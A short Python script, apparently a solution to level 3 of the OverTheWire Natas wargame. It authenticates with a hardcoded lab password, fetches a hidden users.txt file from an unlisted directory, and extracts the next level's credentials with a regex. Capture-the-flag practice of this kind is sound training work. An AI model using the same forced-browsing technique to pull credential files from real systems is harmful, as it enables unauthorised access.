import requests
import re

user = "natas3"
pwd = "sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14"

url = 'http://%s.natas.labs.overthewire.org/s3cr3t/users.txt' % user
session = requests.Session()

response = session.get(url, auth=(user,pwd))
content = response.text

print(re.findall('natas4:(.*)',content)[0])